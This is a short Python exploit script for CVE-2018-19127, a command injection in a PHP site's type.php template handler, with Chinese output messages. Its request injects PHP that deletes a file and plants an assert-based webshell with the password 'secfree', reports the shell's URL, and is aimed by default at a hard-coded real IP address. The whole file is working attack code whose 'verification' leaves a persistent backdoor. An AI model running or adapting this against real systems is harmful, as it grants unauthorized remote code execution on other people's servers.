#!/usr/bin/env python3

'''
name: CVE-2018-19127 命令注入漏洞
description: CVE-2018-19127 命令注入漏洞
'''

import re
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()

class CVE_2018_19127_BaseVerify:
    def __init__(self, url):
        self.url = url
        self.headers={
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
            }

    def run(self):
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        url = self.url + "/type.php?template=tag_(){};@unlink(FILE);assert($_POST[secfree]);{//../rss"
        try:
            results = requests.get(url, headers = self.headers, allow_redirects = False, verify=False).text
            c = re.findall(r"function.assert'>(.+?)</a>",results)
            if c[0] == "function.assert":
                print('存在CVE-2018-19127漏洞,WebShell地址为:' + self.url + '/data/cache_template/rss.tpl.php|secfree')
                return True
            else:
                print('不存在CVE-2018-19127漏洞')
                return False
        except Exception as e:
            #print(e)
            print('不存在CVE-2018-19127漏洞')
            return False
        finally:
            pass

if __name__ == '__main__':
    CVE_2018_19127 = CVE_2018_19127_BaseVerify("https://198.74.60.78:8443")
    CVE_2018_19127.run()